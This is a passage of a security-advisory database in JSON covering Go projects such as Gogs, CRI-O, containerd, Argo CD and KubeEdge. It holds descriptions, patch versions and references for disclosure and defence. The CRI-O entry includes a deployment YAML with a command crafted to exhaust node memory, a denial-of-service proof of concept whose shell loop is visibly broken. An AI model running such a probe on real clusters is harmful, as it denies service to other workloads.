upgraded to 2.1.1)\n\n### Workarounds\nNo workaround available.\n\n### References\n* https://github.com/edgexfoundry/edgex-go/security/advisories/GHSA-g63h-q855-vp3q\n* https://github.com/edgexfoundry/device-sdk-go/pull/1161 (patch against Kamakura)\n* https://github.com/edgexfoundry/edgex-go/pull/4016 (patch against Kamakura)\n* https://github.com/edgexfoundry/edgex-go/pull/4039 (cherry-pick patch against Jakarta)\n* https://github.com/edgexfoundry/device-sdk-go/pull/1167 (differs from patch on main: don't copy PW in vs delete it after)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Contact us in the [Slack #security channel](https://slack.edgexfoundry.org/)\n* Open an issue in [edgex-go](https://github.com/edgexfoundry/edgex-go)\n* Email us at [EdgeX-TSC-Security@lists.edgexfoundry.org](mailto:EdgeX-TSC-Security@lists.edgexfoundry.org)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/edgexfoundry/device-sdk-go/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/edgexfoundry/app-functions-sdk-go/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/edgexfoundry/edgex-go/security/advisories/GHSA-g63h-q855-vp3q"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31066"}, {"type": "WEB", "url": "https://github.com/edgexfoundry/device-sdk-go/pull/1161"}, {"type": "WEB", "url": "https://github.com/edgexfoundry/edgex-go/pull/4016"}, {"type": "PACKAGE", "url": "https://github.com/edgexfoundry/edgex-go"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-06-17T01:11:42Z", "nvd_published_at": "2022-06-14T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-pj96-4jhv-v792", "modified": "2022-06-02T20:46:30Z", "published": "2022-06-02T20:46:30Z", "aliases": [], "summary": "Cross site scripting via cookies in gogs", "details": "### Impact\n\nThere is no known practical impact other than it is just possible to manipulate CSRF cookie and XSS the malicious user self.\n\n### Patches\n\nInvalid characters of CSRF tokens are stripped after reading cookie. Users should upgrade to 0.12.8 or the latest 0.13.0+dev.\n\n### Workarounds\n\nNo need for workarounds.\n\n### References\n\nN/A\n\n### For more information\n\nIf you have any questions or comments about this advisory, please post on https://github.com/gogs/gogs/issues/6953.\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "gogs.io/gogs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.8"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/gogs/gogs/security/advisories/GHSA-pj96-4jhv-v792"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/issues/6953"}, {"type": "PACKAGE", "url": "https://github.com/gogs/gogs"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2022-06-02T20:46:30Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-994f-7g86-qr56", "modified": "2022-06-17T19:21:00Z", "published": "2022-06-08T20:15:11Z", "aliases": ["CVE-2022-1992"], "summary": "Path Traversal in file editor on Windows in Gogs", "details": "### Impact\n\nThe malicious user is able to delete and upload arbitrary file(s). All installations on Windows with [repository upload enabled (default)](https://github.com/gogs/gogs/blob/f36eeedbf89328ee70cc3a2e239f6314f9021f58/conf/app.ini#L127-L129) are affected.\n\n### Patches\n\nPath cleaning has accommodated for Windows. Users should upgrade to 0.12.9 or the latest 0.13.0+dev.\n\n### Workarounds\n\nN/A\n\n### References\n\nhttps://huntr.dev/bounties/2e8cdc57-a9cf-46ae-9088-87f09e6c90ab/\n\n### For more information\n\nIf you have any questions or comments about this advisory, please post on #7001.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "gogs.io/gogs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.9"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/gogs/gogs/security/advisories/GHSA-994f-7g86-qr56"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-1992"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/commit/2ca014250fbf0bba94c914d9e43b1f6d8eca3bb0"}, {"type": "PACKAGE", "url": "https://github.com/gogs/gogs"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/blob/f36eeedbf89328ee70cc3a2e239f6314f9021f58/conf/app.ini#L127-L129"}, {"type": "WEB", "url": "https://huntr.dev/bounties/2e8cdc57-a9cf-46ae-9088-87f09e6c90ab"}, {"type": "WEB", "url": "https://huntr.dev/bounties/2e8cdc57-a9cf-46ae-9088-87f09e6c90ab/"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-06-08T20:15:11Z", "nvd_published_at": "2022-06-09T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-67mx-jc2f-jgjm", "modified": "2022-06-17T19:21:46Z", "published": "2022-06-08T22:34:21Z", "aliases": ["CVE-2022-1986"], "summary": "OS Command Injection in file editor in Gogs", "details": "### Impact\n\nThe malicious user is able to update a crafted `config` file into repository's `.git` directory in combination with crafted file deletion to gain SSH access to the server. All installations with [repository upload enabled (default)](https://github.com/gogs/gogs/blob/f36eeedbf89328ee70cc3a2e239f6314f9021f58/conf/app.ini#L127-L129) are affected.\n\n### Patches\n\nFile deletions are prohibited to repository's `.git` directory. Users should upgrade to 0.12.9 or the latest 0.13.0+dev.\n\n### Workarounds\n\nN/A\n\n### References\n\nhttps://huntr.dev/bounties/776e8f29-ff5e-4501-bb9f-0bd335007930/\n\n### For more information\n\nIf you have any questions or comments about this advisory, please post on #7000.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "gogs.io/gogs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.9"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/gogs/gogs/security/advisories/GHSA-67mx-jc2f-jgjm"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-1986"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/commit/38aff73251cc46ced96dd608dab6190415032a82"}, {"type": "PACKAGE", "url": "https://github.com/gogs/gogs"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/blob/f36eeedbf89328ee70cc3a2e239f6314f9021f58/conf/app.ini#L127-L129"}, {"type": "WEB", "url": "https://huntr.dev/bounties/776e8f29-ff5e-4501-bb9f-0bd335007930"}, {"type": "WEB", "url": "https://huntr.dev/bounties/776e8f29-ff5e-4501-bb9f-0bd335007930/"}], "database_specific": {"cwe_ids": ["CWE-78"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-06-08T22:34:21Z", "nvd_published_at": "2022-06-09T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fcm2-6c3h-pg6j", "modified": "2023-07-24T19:33:40Z", "published": "2022-06-06T21:50:21Z", "aliases": ["CVE-2022-1708"], "summary": "Node DOS by way of memory exhaustion through ExecSync request in CRI-O", "details": "### Description\nAn ExecSync request runs a command in a container and returns the output to the Kubelet. It is used for readiness and liveness probes within a pod. The way CRI-O runs ExecSync commands is through conmon. CRI-O asks conmon to start the process, and conmon writes the output to disk. CRI-O then reads the output and returns it to the Kubelet.\n\nIf the output of the command is large enough, it is possible to exhaust the memory (or disk usage) of the node. The following deployment is an example yaml file that will output around 8GB of \u2018A\u2019 characters, which would be written to disk by conmon and read by CRI-O.\n\n```yaml\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment100\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.14.2\n        lifecycle:\n          postStart:\n            exec:\n              command: [\"/bin/sh\", \"-c\", \"seq 1 50000000`; do echo -n 'aaaaaaaaaaaaaaaa'; done\"]\n```\n\n### Impact\nIt is possible for the node to be exhausted of memory or disk space, depending on the node the command is being run on. What is further problematic is that the memory and disk usage aren't attributed to the container, as this file and its processing are implementation details of CRI-O. The consequence of the exhaustion is that other services on the node, e.g. other containers, will be unable to allocate memory and thus causing a denial of service.\n\n### Patches\nThis vulnerability will be fixed in 1.24.1, 1.23.3, 1.22.5, v1.21.8, v1.20.8, v1.19.7\n\n### Workarounds\nAt the time of writing, no workaround exists other than ensuring only trusted images are used.\n\n### References\nhttps://github.com/containerd/containerd/security/advisories/GHSA-5ffw-gxpp-mxpf\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the CRI-O repo](http://github.com/cri-o/cri-o/issues)\n* To make a report, email your vulnerability to the private\n[cncf-crio-security@lists.cncf.io](mailto:cncf-crio-security@lists.cncf.io) list\nwith the security details and the details expected for [all CRI-O bug\nreports](https://github.com/cri-o/cri-o/blob/main/.github/ISSUE_TEMPLATE/bug-report.yml).\n\n### Credits\nDisclosed by Ada Logics in a security audit sponsored by CNCF and facilitated by OSTIF.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cri-o/cri-o"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.24.0"}, {"fixed": "1.24.1"}]}], "versions": ["1.24.0"]}, {"package": {"ecosystem": "Go", "name": "github.com/cri-o/cri-o"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.23.0"}, {"fixed": "1.23.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cri-o/cri-o"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.22.5"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cri-o/cri-o/security/advisories/GHSA-fcm2-6c3h-pg6j"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-1708"}, {"type": "WEB", "url": "https://github.com/cri-o/cri-o/commit/f032cf649ecc7e0c46718bd9e7814bfb317cb544"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2085361"}, {"type": "PACKAGE", "url": "https://github.com/cri-o/cri-o"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-770"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-06-06T21:50:21Z", "nvd_published_at": "2022-06-07T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-56j7-2pm8-rgmx", "modified": "2022-06-02T20:52:23Z", "published": "2022-06-02T20:52:23Z", "aliases": ["CVE-2021-32546"], "summary": "OS Command Injection in gogs", "details": "### Impact\n\nThe malicious user is able to update a crafted `config` file into repository's `.git` directory with to gain SSH access to the server. All installations with [repository upload enabled (default)](https://github.com/gogs/gogs/blob/f36eeedbf89328ee70cc3a2e239f6314f9021f58/conf/app.ini#L127-L129) are affected.\n\n### Patches\n\nRepository file updates are prohibited to its `.git` directory. Users should upgrade to 0.12.8 or the latest 0.13.0+dev.\n\n### Workarounds\n\nN/A\n\n### References\n\nN/A\n\n### For more information\n\nIf you have any questions or comments about this advisory, please post on #6555.\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "gogs.io/gogs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.8"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/gogs/gogs/security/advisories/GHSA-56j7-2pm8-rgmx"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-32546"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/issues/6555"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/pull/6986"}, {"type": "PACKAGE", "url": "https://github.com/gogs/gogs"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/blob/f36eeedbf89328ee70cc3a2e239f6314f9021f58/conf/app.ini#L127-L129"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/releases"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/releases/tag/v0.12.8"}], "database_specific": {"cwe_ids": ["CWE-78"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-06-02T20:52:23Z", "nvd_published_at": "2022-06-02T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5ffw-gxpp-mxpf", "modified": "2022-06-06T22:07:10Z", "published": "2022-06-06T22:07:10Z", "aliases": ["CVE-2022-31030"], "summary": "containerd CRI plugin: Host memory exhaustion through ExecSync", "details": "### Impact\n\nA bug was found in containerd's CRI implementation where programs inside a container can cause the containerd daemon to consume memory without bound during invocation of the `ExecSync` API.  This can cause containerd to consume all available memory on the computer, denying service to other legitimate workloads.  Kubernetes and crictl can both be configured to use containerd's CRI implementation; `ExecSync` may be used when running probes or when executing processes via an \"exec\" facility.\n\n### Patches\n\nThis bug has been fixed in containerd 1.6.6 and 1.5.13.  Users should update to these versions to resolve the issue.\n\n### Workarounds\n\nEnsure that only trusted images and commands are used. \n\n### References\n\n* Similar fix in cri-o's CRI implementation https://github.com/cri-o/cri-o/security/advisories/GHSA-fcm2-6c3h-pg6j\n\n### Credits\n\nThe containerd project would like to thank David Korczynski and Adam Korczynski of ADA Logics for responsibly disclosing this issue in accordance with the [containerd security policy](https://github.com/containerd/project/blob/main/SECURITY.md) during a security audit sponsored by CNCF and facilitated by OSTIF.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [containerd](https://github.com/containerd/containerd/issues/new/choose)\n* Email us at [security@containerd.io](mailto:security@containerd.io)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containerd/containerd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.5.13"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/containerd/containerd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.6.0"}, {"fixed": "1.6.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/containerd/containerd/security/advisories/GHSA-5ffw-gxpp-mxpf"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31030"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/commit/c1bcabb4541930f643aa36a2b38655e131346382"}, {"type": "PACKAGE", "url": "https://github.com/containerd/containerd"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/REOZCUAPCA7NFDWYBDYX6EYXWLHABKBO/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/WSIGDBHAB3I75JBJNGWEPBTJPS2FOVHD/"}, {"type": "WEB", "url": "https://www.debian.org/security/2022/dsa-5162"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2022/06/07/1"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-06-06T22:07:10Z", "nvd_published_at": "2022-06-09T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8f4f-v9x5-cg6j", "modified": "2022-06-25T07:19:34Z", "published": "2022-06-25T07:19:34Z", "aliases": ["CVE-2022-31076"], "summary": "CloudCore UDS Server: Malicious Message can crash CloudCore", "details": "### Impact\nA malicious message can crash CloudCore by triggering a null-pointer dereference in the UDS Server. Since the UDS Server only communicates with the CSI Driver on the cloud side, the attack is limited to the local host network. As such, an attacker would already need to be an authenticated user of the Cloud.\n \nIt will be affected only when users turn on the unixsocket switch in the config file `cloudcore.yaml` as below:\n```\nmodules:\n  cloudHub:\n    ...\n    unixsocket:\n      address: xxx\n      enable: true\n```\n\n### Patches\nThis bug has been fixed in Kubeedge 1.11.0, 1.10.1, and 1.9.3. Users should update to these versions to resolve the issue.\n\n### Workarounds\nDisable the unixsocket switch of CloudHub in the config file `cloudcore.yaml`.\n\n### References\nNA\n\n### Credits\nThanks David Korczynski and Adam Korczynski of ADA Logics for responsibly disclosing this issue in accordance with the [kubeedge security policy](https://github.com/kubeedge/kubeedge/security/policy) during a security audit sponsored by CNCF and facilitated by OSTIF.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [KubeEdge repo](https://github.com/kubeedge/kubeedge/issues/new/choose)\n* To make a vulnerability report, email your vulnerability to the private [cncf-kubeedge-security@lists.cncf.io](mailto:cncf-kubeedge-security@lists.cncf.io) list with the security details and the details expected for [KubeEdge bug reports](https://github.com/kubeedge/kubeedge/blob/master/.github/ISSUE_TEMPLATE/bug-report.md).\n\n**Notes:** This vulnerability was found by fuzzing KubeEdge by way of OSS-Fuzz.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:A/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kubeedge/kubeedge"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.10.0"}, {"fixed": "1.10.1"}]}], "versions": ["1.10.0"]}, {"package": {"ecosystem": "Go", "name": "github.com/kubeedge/kubeedge"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.9.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/kubeedge/kubeedge/security/advisories/GHSA-8f4f-v9x5-cg6j"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31076"}, {"type": "WEB", "url": "https://github.com/kubeedge/kubeedge/pull/3899/commits/5d60ae9eabd6b6b7afe38758e19bbe8137664701"}, {"type": "PACKAGE", "url": "https://github.com/kubeedge/kubeedge"}], "database_specific": {"cwe_ids": ["CWE-476"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-06-25T07:19:34Z", "nvd_published_at": "2022-06-27T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-q4w5-4gq2-98vm", "modified": "2022-06-21T20:04:51Z", "published": "2022-06-21T20:04:51Z", "aliases": ["CVE-2022-31036"], "summary": "Symlink following allows leaking out-of-bounds YAML files from Argo CD repo-server", "details": "### Impact\n\nAll unpatched versions of Argo CD starting with v1.3.0 are vulnerable to a symlink following bug allowing a malicious user with repository write access to leak sensitive YAML files from Argo CD's repo-server.\n\nA malicious Argo CD user with write access for a repository which is (or may be) used in a Helm-type Application may commit a symlink which points to an out-of-bounds file. If the target file is a valid YAML file, the attacker can read the contents of that file.\n\nSensitive files which could be leaked include manifest files from other Applications' source repositories (potentially decrypted files, if you are using a decryption plugin) or any YAML-formatted secrets which have been mounted as files on the repo-server.\n\n### Patches\n\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.4.1\n* v2.3.5\n* v2.2.10\n* v2.1.16\n\n### Workarounds\n\n* If you are using >=v2.3.0 and do not have any Helm-type Applications, [disable the Helm config management tool](https://argo-cd.readthedocs.io/en/stable/user-guide/tool_detection/#disable-built-in-tools).\n\n#### Mitigations\n\n* Avoid mounting YAML-formatted secrets as files on the repo-server.\n* Upgrade to >=2.3.0 to significantly reduce the risk of leaking out-of-bounds manifest files. Starting with 2.3.0, repository paths are randomized, and read permissions are restricted when manifests are not being actively being generated. This makes it very difficult to craft and use a malicious symlink.\n\n#### Best practices which can mitigate risk\n\n* Limit who has push access to manifest repositories.\n* Limit who is allowed to configure new source repositories.\n\n### Credits\n\nDisclosed by ADA Logics in a security audit of the Argo project sponsored by CNCF and facilitated by OSTIF. Thanks to Adam Korczynski and David Korczynski for their work on the audit.\n\n### References\n\n* List of [types of Applications](https://argo-cd.readthedocs.io/en/stable/user-guide/application_sources/), including Helm-type\n* [RBAC documentation](https://argo-cd.readthedocs.io/en/stable/operator-manual/rbac/), showing how to limit repository permissions\n\n### For more information\n\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.3.0"}, {"fixed": "2.1.16"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.8.7"}}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.16"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.2.0"}, {"fixed": "2.2.10"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.3.0"}, {"fixed": "2.3.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.4.0"}, {"fixed": "2.4.1"}]}], "versions": ["2.4.0"]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-q4w5-4gq2-98vm"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31036"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/commit/04c305396458508a31d03d44afea07b1c620d7cd"}, {"type": "PACKAGE", "url": "https://github.com/argoproj/argo-cd"}], "database_specific": {"cwe_ids": ["CWE-20", "CWE-59"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-06-21T20:04:51Z", "nvd_published_at": "2022-06-27T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-526x-rm7j-v389", "modified": "2022-06-14T20:05:46Z", "published": "2022-06-03T00:01:07Z", "aliases": ["CVE-2022-30324"], "summary": "Privilege escalation in Hashicorp Nomad", "details": "HashiCorp Nomad and Nomad Enterprise version 0.2.0 up to 1.3.0 were impacted by go-getter vulnerabilities enabling privilege escalation through the artifact stanza in submitted jobs onto the client agent host. Fixed in 1.1.14, 1.2.8, and 1.3.1.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.2.0"}, {"fixed": "1.1.14"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.2.0"}, {"fixed": "1.2.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.3.0"}, {"fixed": "1.3.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-30324"}, {"type": "WEB", "url": "https://discuss.hashicorp.com"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2022-14-nomad-impacted-by-go-getter-vulnerabilities/39932"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/nomad"}], "database_specific": {"cwe_ids": [], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-06-03T22:30:32Z", "nvd_published_at": "2022-06-02T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-r48q-9g5r-8q2h", "modified": "2022-06-17T18:18:04Z", "published": "2022-06-09T00:00:23Z", "aliases": ["CVE-2022-1996"], "summary": "Authorization Bypass Through User-Controlled Key in go-restful", "details": "Authorization Bypass Through User-Controlled Key in GitHub repository emicklei/go-restful prior to v3.8.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/emicklei/go-restful/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.0.0"}, {"fixed": "3.8.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/emicklei/go-restful"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.16.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/emicklei/go-restful/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "2.7.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-1996"}, {"type": "WEB", "url": "https://github.com/emicklei/go-restful/issues/489"}, {"type": "WEB", "url": "https://github.com/emicklei/go-restful/commit/926662532deb450272956c7bc573978464aae74e"}, {"type": "WEB", "url": "https://github.com/emicklei/go-restful/commit/f292efff46ae17e9d104f865a60a39a2ae9402f1"}, {"type": "WEB", "url": "https://github.com/emicklei/go-restful/commit/fd3c327a379ce08c68ef18765bdc925f5d9bad10"}, {"type": "PACKAGE", "url": "https://github.com/emicklei/go-restful"}, {"type": "WEB", "url": "https://huntr.dev/bounties/be837427-415c-4d8c-808b-62ce20aa84f1"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/575BLJ3Y2EQBRNTFR2OSQQ6L2W6UCST3/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/OBDD3Q23RCGAGHIXUCWBU6N3S4RNAKXB/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/RQXU752ALW53OJAF5MG3WMR5CCZVLWW6/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/SO5QC2JFW2PXBWAE27OYYYL5SPFUBHTY/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/W56PP46JVZEKCANBKXFKRVSBBRRMCY6V/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/Z55VUVGO7E5PJFXIOVAY373NZRHBNCI5/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZGQKWD6SE75PFBPFVSZYAKAVXKBZXKWS/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZY2SLWOQR4ZURQ7UBRZ7JIX6H6F5JHJR/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0619"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20220923-0005/"}], "database_specific": {"cwe_ids": ["CWE-639"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-06-09T23:50:21Z", "nvd_published_at": "2022-06-08T13:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qx2j-85q5-ffp8", "modified": "2022-07-07T17:14:28Z", "published": "2022-06-24T00:00:32Z", "aliases": ["CVE-2022-34296"], "summary": "Query predicate bypass in Zalando Skipper", "details": "In Zalando Skipper before 0.13.218, a query predicate could be bypassed via a prepared request.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/zalando/skipper"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.13.218"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-34296"}, {"type": "WEB", "url": "https://github.com/zalando/skipper/pull/2028"}, {"type": "WEB", "url": "https://github.com/zalando/skipper/commit/998a658ce5a68a336a98f4e63e4371e200860dfc"}, {"type": "PACKAGE", "url": "https://github.com/zalando/skipper"}, {"type": "WEB", "url": "https://github.com/zalando/skipper/releases/tag/v0.13.218"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-06-25T07:23:27Z", "nvd_published_at": "2022-06-23T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-958j-443g-7mm7", "modified": "2022-06-02T20:50:21Z", "published": "2022-06-02T20:50:21Z", "aliases": ["CVE-2022-1884"], "summary": "OS Command Injection in gogs", "details": "### Impact\n\nThe malicious user is able to upload a crafted `config` file into repository's `.git` directory with to gain SSH access to the server. All Windows installations with [repository upload enabled (default)](https://github.com/gogs/gogs/blob/f36eeedbf89328ee70cc3a2e239f6314f9021f58/conf/app.ini#L127-L129) are affected.\n\n### Patches\n\nRepository file uploads are prohibited to its `.git` directory. Users should upgrade to 0.12.8 or the latest 0.13.0+dev.\n\n### Workarounds\n\n[Disable repository files 